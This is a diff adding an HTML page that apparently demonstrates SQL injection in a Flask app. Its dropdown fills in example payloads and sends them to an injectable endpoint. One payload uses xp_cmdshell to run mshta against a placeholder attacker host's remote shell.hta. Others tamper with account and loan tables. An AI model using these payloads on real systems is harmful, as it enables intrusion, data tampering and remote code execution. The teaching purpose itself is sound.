@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>FlaskApp</title>
+    <script src="https://cdn.tailwindcss.com?plugins=forms"></script>
+    <script src="https://unpkg.com/@material-tailwind/html@latest/scripts/collapse.js"></script>
+</head>
+<body style="margin-left:100px;">
+    <h1>Hello World!</h1>
+    <h2>Welcome to SQL Injection!</h2>
+
+    <label for="cars">Attack Ventors:</label>
+
+    <select name="cars" id="hack" onchange="changeFunc();">
+        <option value="sel">Optional Select One</option>
+        <option  value="sql">SQLInjection</option>
+         <option value="priv">PrivEscelation</option>
+      <option value="command">CommandInjection</option>
+    </select>
+
+    <div>
+    <span>TableName</span>
+    <input id="TableName" style="width: 100%;" type="text" />
+</div>
+<div style="border: 1px splid silver; margin: 20px ;">    
+<span>Name</span>
+    <input id="Name" type="text" />
+</div>
+<div >
+    <label>Code</label>
+    <code id="sql" style="border: solid silver 1px;"></code>
+</div style="margin:20px">
+    <button class="bg-blue-500 hover:bg-blue-700 text-white font-bold py-2 px-4 rounded"  onclick="hack()">Click Me!</button>
+    
+    <div id="expl" style="width:100%"></div>
+
+
+    </div>
+<script>
+
+
+function changeFunc() {
+    var selectBox = document.getElementById("hack");
+    var selectedValue = selectBox.options[selectBox.selectedIndex].value;
+
+    let tableName = document.getElementById('TableName')
+    let name = document.getElementById("Name")
+    let expl = document.getElementById("expl")
+    let code = document.getElementById('sql')
+    console.log(selectedValue)
+    switch (selectedValue) {
+    case 'sql':
+    tableName.value = "account (name) values ('Joe') --"
+     name.value = "Mike"
+     code.innerHTML = `INSERT INTO  ${tableName.value} (Name) VALUES (%s)`
+     
+     expl.innerHTML = `A Basic SQL Injection Attack will allow me to mess with other peoples data. Typical attacks for this type include:
+     <ul class="list-disc">
+<li>Altering/Deleting Data (my loan for example)</li>
+<li>Altering other peoples data </li>
+
+</ul>
+
+     
+     `
+     
+     
+
+
+
+    break;
+  case 'command':
+
+
+  tableName.value = "account (amount) values (999); EXEC xp_cmdshell 'mshta.exe http://<attacker_IP>/shell.hta'; --"
+     name.value = "Not Me"
+     code.innerHTML = `INSERT INTO  ${tableName.value} (Name) VALUES (%s)`
+     expl.innerHTML = `<span>This allows access to the OS. Typical Attacks for this include:</span>
+     
+     <ul class="list-disc">
+<li>Ransomeware Attacks</li>
+<li>Virus Download and run</li>
+<li>Machine/Network Take Over</li>
+</ul>
+
+     `
+    break;
+
+  case 'priv':
+
+
+console.log('bbbbb')
+  tableName.value = "loan (amount) values (999) --"
+     name.value = "Not Me"
+     code.innerHTML = `INSERT INTO  ${tableName.value} (Name) VALUES (%s)`
+    
+     expl.innerHTML = `Advanced Hack Allows to have control over all of the DB.  This unscoped attack allows attackers to:
+     
+     <ul class="list-disc">
+<li>Delete Tables</li>
+<li>Change data in tables that should be out of scope (change everyones payment routing on loan intake form for example)</li>
+<li>Download and share customer PII</li>
+</ul>
+     
+     `
+     
+     
+
+
+
+  default:
+    console.log(`Sorry, we are out of .`);
+}
+
+   
+
+
+
+   }
+
+   function hack(){
+
+var xhr = new XMLHttpRequest();
+let tableName = document.getElementById('TableName').value
+let name = document.getElementById("Name").value
+xhr.open('GET', `/pyhack?table=${tableName}&name=${name}`  );
+xhr.send(null);
+   }
+
+</script>
+
+</body>
+</html>
